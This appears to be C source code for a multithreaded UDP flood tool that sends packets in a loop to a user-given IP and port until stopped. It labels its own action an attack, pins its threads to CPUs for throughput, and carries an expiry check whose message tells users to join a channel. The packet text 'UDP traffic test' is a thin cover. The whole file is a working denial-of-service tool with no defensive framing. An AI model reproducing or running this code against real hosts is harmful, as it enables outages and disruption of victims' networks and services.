#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <signal.h>
#include <zlib.h>

#define BUFFER_SIZE 9000
#define EXPIRATION_YEAR 2024
#define EXPIRATION_MONTH 10
#define EXPIRATION_DAY 31

char *ip;
int port;
int stop_attack = 0;
char padding_data[2 * 1024 * 1024];
pthread_t *tid;

void handle_stop_signal(int sig) {
    stop_attack = 1;
}

unsigned long calculate_crc32(const char *data) {
    return crc32(0, (const unsigned char *)data, strlen(data));
}

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};   
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;  
    time(&now);   
    if (difftime(now, mktime(&expiration_date)) > 0) {
        printf("This file is closed by ...\nJOIN CHANNEL TO USE THIS FILE.\n");
        exit(EXIT_FAILURE);
    }
}

void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(sched_getcpu(), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    snprintf(buffer, sizeof(buffer), "UDP traffic test");

    while (!stop_attack) {
        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                            (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    check_expiration();

    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <1/2 (start/stop)> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    int action = atoi(argv[3]);
    int threads = atoi(argv[4]);

    memset(padding_data, 0, sizeof(padding_data));
    unsigned long crc = calculate_crc32("..");
    printf("... CRC32: %lx\n", crc);

    if (action == 1) {
        // Start attack
        printf("Starting attack on %s:%d with %d threads...\n", ip, port, threads);

        stop_attack = 0;
        tid = malloc(threads * sizeof(pthread_t));

        signal(SIGINT, handle_stop_signal);

        for (int i = 0; i < threads; i++) {
            if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
                perror("Thread creation failed");
                exit(EXIT_FAILURE);
            }
        }

        for (int i = 0; i < threads; i++) {
            pthread_join(tid[i], NULL);
        }

        free(tid);
    } else if (action == 2) {
        // Stop attack
        printf("Stopping attack...\n");
        stop_attack = 1;
    } else {
        fprintf(stderr, "Invalid action. Use 1 to start and 2 to stop.\n");
        exit(EXIT_FAILURE);
    }

    return 0;
}